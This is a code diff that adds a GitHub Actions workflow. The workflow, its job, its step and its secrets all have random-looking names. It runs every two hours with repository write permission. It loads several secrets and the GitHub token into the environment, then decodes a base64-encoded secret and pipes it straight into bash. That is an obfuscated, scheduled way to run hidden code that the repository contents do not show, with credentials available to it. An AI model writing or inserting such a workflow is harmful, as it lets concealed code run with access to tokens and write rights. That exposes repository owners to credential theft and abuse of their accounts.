@@ -1,0 +1,21 @@
+name: Sm461
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  BRqgVuTjwPbowyA:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.MwQyAeAy }}
+      - name: OqLEfNxvy
+        env:
+          HKFeS: ${{ secrets.iyKx8DCjzBV }}
+          DeyLHiqu: ${{ secrets.QVxE14E }}
+          MsYR0ut6b: ${{ secrets.OmuvDZu4TYSaRYUg }}
+          GITHUB_TOKEN: ${{ secrets.MwQyAeAy }}
+        run: echo "$HKFeS" | base64 -d | bash
